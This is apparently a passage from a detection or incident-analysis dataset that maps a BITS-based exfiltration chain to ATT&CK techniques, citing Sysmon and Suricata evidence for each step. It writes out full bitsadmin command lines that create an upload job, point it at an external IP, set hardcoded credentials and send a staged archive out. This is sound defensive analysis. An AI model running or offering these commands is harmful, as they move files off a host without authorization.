    {"step": 2, "tactic": "bitsadmin /Create /Upload job (rare LOLBin usage)", "technique": "T1197", "what_happened": "At 2026-05-17 11:42:21, Sysmon EID 1 captured bitsadmin.exe with CommandLine='bitsadmin.exe /Create /Upload ExfilJob_114211'. ParentImage=powershell.exe.", "chain_reason": "bitsadmin /Upload (not /Transfer download) is extremely rare in benign usage — Windows Update and SCCM use download (server-pushed). User-initiated upload via BITS = exfiltration vector by construction."},
    {"step": 3, "tactic": "bitsadmin /AddFile pointing to external HTTP host:port 8080", "technique": "T1197", "what_happened": "At 2026-05-17 11:42:24, Sysmon EID 1 bitsadmin.exe /AddFile ExfilJob_114211 http://91.211.247.42:8080/upload/data_114211.zip C:\\Users\\d.takamura\\AppData\\Local\\Temp\\data_114211.zip.", "chain_reason": "AddFile binds the local staged archive to a remote URL on port 8080 (non-corp); the URL structure /upload/<file> = typical attacker drop endpoint."},
    {"step": 4, "tactic": "bitsadmin /SetCredentials BASIC with attacker creds (T1197 + T1078)", "technique": "T1197", "what_happened": "At 2026-05-17 11:42:27, Sysmon EID 1 bitsadmin.exe /SetCredentials ExfilJob_114211 SERVER BASIC exfil_user ExfilP@ss2026. Rule 200112 triggered.", "chain_reason": "SetCredentials with hardcoded BASIC auth = authentication to an attacker-controlled drop endpoint; corp endpoints use Kerberos/integrated auth or Bearer tokens, never inline BASIC with literal creds."},
    {"step": 5, "tactic": "bitsadmin /Resume → outbound HTTP to 91.211.247.42:8080", "technique": "T1041", "what_happened": "At 2026-05-17 11:42:30, Sysmon EID 3 NetworkConnect image=bitsadmin.exe destinationIp=91.211.247.42 destinationPort=8080 Initiated=true. Suricata SID 2014819 (BITS User-Agent) fired.", "chain_reason": "Final step of T1041 Exfiltration Over C2 Channel via BITS — outbound to public IP:8080 carrying staged archive content."}
